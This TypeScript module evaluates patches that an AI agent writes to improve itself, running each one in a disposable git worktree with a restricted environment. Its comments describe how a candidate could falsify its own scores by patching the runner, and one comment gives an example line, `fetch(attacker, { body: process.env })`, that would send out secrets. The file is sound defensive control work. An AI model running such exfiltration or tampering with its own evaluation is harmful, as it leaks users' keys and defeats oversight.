/**
 * Faza 2 Slice 2 — the code-RSI sandbox eval runner.
 * Spec: `docs/superpowers/specs/2026-07-01-faza2-code-rsi-design.md` §3.
 *
 * Lifecycle (spec §5.1, LOCKED: fresh worktree per candidate, destroy always):
 *
 *   git worktree add --detach <scratch>/<id> <baseCommit>   (from repoRoot)
 *   git apply <patch>                                        (cwd = pkg dir)
 *   bun install / bun test / bunx tsc --noEmit / bun run build
 *   git worktree remove --force                              (ALWAYS, finally)
 *
 * Trust boundary (spec §2): this module reports RAW measurements only —
 * test pass/fail counts, tsc exit, build exit, changed lines. The scalar
 * score is computed in Rust (`scorer.rs`, Slice 3); TS never grades itself.
 * The current engine evaluates the patched COPY, never itself: the worktree
 * is disposable and the running process is untouched.
 *
 * This file is on the patch DENYLIST — a candidate that could patch the
 * runner could lie about its own measurements.
 *
 * Command execution is injectable (`ExecFn`) so tests pin the lifecycle
 * (sequencing, fail-fast, teardown-on-every-path) without spawning bun/tsc.
 */

import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdir, rm } from "node:fs/promises";
import type { CodeGenome } from "./code-genome.ts";

/** One child process run, as the runner sees it. */
export interface ExecResult {
  exitCode: number;
  stdout: string;
  stderr: string;
  timedOut: boolean;
}

/** Injectable process spawner. Default: `bunExec` (Bun.spawn + kill timer). */
export type ExecFn = (
  cmd: string[],
  opts: { cwd: string; timeoutMs: number; stdin?: string },
) => Promise<ExecResult>;

/** Wall-clock caps per step (spec §3 Slice 2 "wall-clock caps"). */
export interface CodeSandboxTimeouts {
  gitMs: number;
  installMs: number;
  testsMs: number;
  tscMs: number;
  buildMs: number;
}

export const DEFAULT_CODE_SANDBOX_TIMEOUTS: CodeSandboxTimeouts = {
  gitMs: 60_000,
  installMs: 300_000,
  testsMs: 600_000,
  tscMs: 180_000,
  buildMs: 600_000,
};

export interface CodeSandboxOptions {
  /** Root of the git repo worktrees are created from (the monorepo). */
  repoRoot: string;
  /** Where disposable worktrees live. Default: `<tmp>/cinderpaw-code-rsi`. */
  scratchDir?: string;
  /** Package dir (relative to repo root) where bun commands run and diff
   *  paths resolve. Default: `"CinderpawAgent"` (diffs are `src/rsi/…`). */
  packageSubdir?: string;
  timeouts?: Partial<CodeSandboxTimeouts>;
  /** Inject a fake in tests; production uses the Bun.spawn default. */
  exec?: ExecFn;
}

/** Raw, unscored measurements — the Rust scorer's inputs (spec §2.1). A
 *  failing test suite or dirty tsc is a MEASUREMENT here, not an error:
 *  only infrastructure failures (worktree, apply, install) abort the run. */
export interface CodeEvalMeasurements {
  testsPassed: number;
  testsFailed: number;
  testsExitCode: number;
  tscExitCode: number;
  buildExitCode: number;
  /** Added + removed lines, from `git apply --numstat` over the patch. */
  changedLines: number;
  durationMs: number;
}

export type CodeEvalResult =
  | { ok: true; measurements: CodeEvalMeasurements }
  | { ok: false; stage: "worktree_create" | "patch_apply" | "install"; reason: string };

/** Run one code candidate through the disposable-worktree pipeline.
 *  Never throws for candidate-caused failures; the worktree is destroyed
 *  on every path. */
export async function evaluateCodePatch(
  genome: Pick<CodeGenome, "patch" | "baseCommit">,
  options: CodeSandboxOptions,
): Promise<CodeEvalResult> {
  const started = Date.now();
  const exec = options.exec ?? bunExec;
  const t = { ...DEFAULT_CODE_SANDBOX_TIMEOUTS, ...options.timeouts };
  const scratch = options.scratchDir ?? join(tmpdir(), "cinderpaw-code-rsi");
  const worktree = join(scratch, `wt-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  const pkgSubdir = options.packageSubdir ?? "CinderpawAgent";
  const pkgDir = join(worktree, pkgSubdir);

  await mkdir(scratch, { recursive: true });

  const created = await exec(
    ["git", "worktree", "add", "--detach", worktree, genome.baseCommit],
    { cwd: options.repoRoot, timeoutMs: t.gitMs },
  );
  if (created.exitCode !== 0) {
    return {
      ok: false,
      stage: "worktree_create",
      reason: firstLine(created.stderr) || `git worktree add exited ${created.exitCode}`,
    };
  }

  try {
    // Diff paths are package-relative (`src/rsi/…`); `--directory` prefixes
    // them for the worktree root. NEVER run `git apply` from a subdirectory:
    // git interprets patch paths relative to the repo root there and
    // silently IGNORES ones "outside" the cwd — exit 0, nothing applied.
    const applyArgs = ["git", "apply", `--directory=${pkgSubdir}`];

    // Cheap pre-measurement: changed lines straight off the patch text.
    const numstat = await exec([...applyArgs, "--numstat"], {
      cwd: worktree,
      timeoutMs: t.gitMs,
      stdin: genome.patch,
    });
    const changedLines = numstat.exitCode === 0 ? sumNumstat(numstat.stdout) : 0;

    const applied = await exec([...applyArgs, "--whitespace=nowarn"], {
      cwd: worktree,
      timeoutMs: t.gitMs,
      stdin: genome.patch,
    });
    if (applied.exitCode !== 0) {
      return {
        ok: false,
        stage: "patch_apply",
        reason: firstLine(applied.stderr) || `git apply exited ${applied.exitCode}`,
      };
    }

    // `--ignore-scripts`: re-installing the existing dependency tree runs every
    // dependency's lifecycle scripts, in a worktree holding code the agent just
    // wrote. Nothing about evaluating a patch needs them to run.
    const installed = await exec(["bun", "install", "--ignore-scripts"], { cwd: pkgDir, timeoutMs: t.installMs });
    if (installed.exitCode !== 0) {
      return {
        ok: false,
        stage: "install",
        reason: installed.timedOut
          ? `bun install timed out after ${t.installMs}ms`
          : firstLine(installed.stderr) || `bun install exited ${installed.exitCode}`,
      };
    }

    // From here down everything is a measurement — failures are DATA for
    // the Rust scorer, not aborts.
    const tests = await exec(["bun", "test"], { cwd: pkgDir, timeoutMs: t.testsMs });
    const summary = parseBunTestSummary(tests.stdout + "\n" + tests.stderr);
    const tsc = await exec(["bunx", "tsc", "--noEmit"], { cwd: pkgDir, timeoutMs: t.tscMs });
    const build = await exec(["bun", "run", "build"], { cwd: pkgDir, timeoutMs: t.buildMs });

    return {
      ok: true,
      measurements: {
        testsPassed: summary.passed,
        testsFailed: summary.failed,
        testsExitCode: tests.exitCode,
        tscExitCode: tsc.exitCode,
        buildExitCode: build.exitCode,
        changedLines,
        durationMs: Date.now() - started,
      },
    };
  } finally {
    await destroyWorktree(exec, options.repoRoot, worktree, t.gitMs);
  }
}

/** Fail-safe teardown: `git worktree remove --force`, then a filesystem
 *  sweep + prune if git refused (e.g. a process still holds a file on
 *  Windows). Best-effort — teardown never throws into the eval result. */
async function destroyWorktree(
  exec: ExecFn,
  repoRoot: string,
  worktree: string,
  timeoutMs: number,
): Promise<void> {
  try {
    const removed = await exec(["git", "worktree", "remove", "--force", worktree], {
      cwd: repoRoot,
      timeoutMs,
    });
    if (removed.exitCode !== 0) {
      await rm(worktree, { recursive: true, force: true });
      await exec(["git", "worktree", "prune"], { cwd: repoRoot, timeoutMs });
    }
  } catch {
    // ponytail: a leaked scratch worktree is disk litter, not a safety
    // issue — the next `git worktree prune` collects it.
  }
}

/** Parse bun's test summary ("N pass" / "N fail"). Exported for tests.
 *  Unparseable output → zeros; `testsExitCode` still carries the signal. */
export function parseBunTestSummary(text: string): { passed: number; failed: number } {
  const passed = /(\d+)\s+pass/.exec(text);
  const failed = /(\d+)\s+fail/.exec(text);
  return {
    passed: passed ? Number(passed[1]) : 0,
    failed: failed ? Number(failed[1]) : 0,
  };
}

/** Sum added+removed from `git apply --numstat` output ("A\tR\tpath" per
 *  line; "-" marks binary, which the policy wall already rejected → 0). */
export function sumNumstat(stdout: string): number {
  let total = 0;
  for (const line of stdout.split("\n")) {
    const m = /^(\d+)\t(\d+)\t/.exec(line);
    if (m) total += Number(m[1]) + Number(m[2]);
  }
  return total;
}

function firstLine(s: string): string {
  return s.split("\n", 1)[0]?.trim() ?? "";
}

/** Resolve `bun`/`bunx` to the real executable path. Windows `uv_spawn`
 *  does not apply PATHEXT, so a bare "bun" that works in a shell is
 *  ENOENT from Bun.spawn; `Bun.which` finds bun.exe properly. `bunx` is
 *  sugar for `bun x`. Everything else spawns as-is. */
function resolveCmd(cmd: string[]): string[] {
  const [head, ...rest] = cmd;
  if (head !== "bun" && head !== "bunx") return cmd;
  const bun = Bun.which("bun") ?? head;
  return head === "bunx" ? [bun, "x", ...rest] : [bun, ...rest];
}

/**
 * The environment a candidate patch's build and test run is allowed to see.
 *
 * This used to be `{ ...process.env }` — the sidecar's whole environment,
 * handed to code the agent wrote itself and has not reviewed. That includes
 * `CINDERPAW_API_KEY` (the bearer token for this machine's runtime), `CINDERPAW_DB_KEY`
 * (the at-rest key for semantic memory, which holds whatever the user has said),
 * and whatever provider keys the user exported in the shell that launched
 * Cinderpaw. One `fetch(attacker, { body: process.env })` inside a test file and
 * they are gone — and the crash watchdog's revert cannot un-send them.
 *
 * `crates/cinderpaw-core/src/tools.rs` already does this correctly for the
 * `code_execute` tool (`env_clear()` plus PATH); this is the same rule applied
 * to the place that runs far less trusted code.
 *
 * ponytail: an allowlist, deliberately. A denylist of "the secret ones" needs
 * updating every time a new secret is added, and the day it is forgotten is the
 * day it leaks.
 */
function minimalEnv(): Record<string, string> {
  const env: Record<string, string> = {};
  const keep = [
    "PATH",
    "HOME",
    // bun/node need these to find their own install and a scratch dir.
    "BUN_INSTALL",
    "XDG_CACHE_HOME",
    "LANG",
    "LC_ALL",
    "TZ",
    // Windows: without these a spawned process cannot locate its runtime.
    "SYSTEMROOT",
    "SYSTEMDRIVE",
    "WINDIR",
    "TEMP",
    "TMP",
    "PATHEXT",
    "COMSPEC",
    "USERPROFILE",
    "APPDATA",
    "LOCALAPPDATA",
    "PROGRAMFILES",
    "PROGRAMDATA",
  ];
  for (const key of keep) {
    const value = process.env[key];
    if (value != null) env[key] = value;
  }
  // Tests that legitimately need a flag can be given one explicitly here; the
  // point is that nothing arrives by accident.
  env.CI = "1";
  env.NODE_ENV = "test";
  return env;
}

/** Production ExecFn: Bun.spawn with a kill timer. timedOut → exitCode -2
 *  (same convention as process-sandbox.ts). */
export async function bunExec(
  cmd: string[],
  opts: { cwd: string; timeoutMs: number; stdin?: string },
): Promise<ExecResult> {
  const proc = Bun.spawn({
    cmd: resolveCmd(cmd),
    cwd: opts.cwd,
    env: minimalEnv(),
    stdin: opts.stdin != null ? "pipe" : "ignore",
    stdout: "pipe",
    stderr: "pipe",
  });
  if (opts.stdin != null && proc.stdin) {
    proc.stdin.write(opts.stdin);
    await proc.stdin.end();
  }
  let timedOut = false;
  const timer = setTimeout(() => {
    timedOut = true;
    proc.kill();
  }, opts.timeoutMs);
  try {
    const [stdout, stderr, exitCode] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
      proc.exited,
    ]);
    return { exitCode: timedOut ? -2 : exitCode, stdout, stderr, timedOut };
  } finally {
    clearTimeout(timer);
  }
}
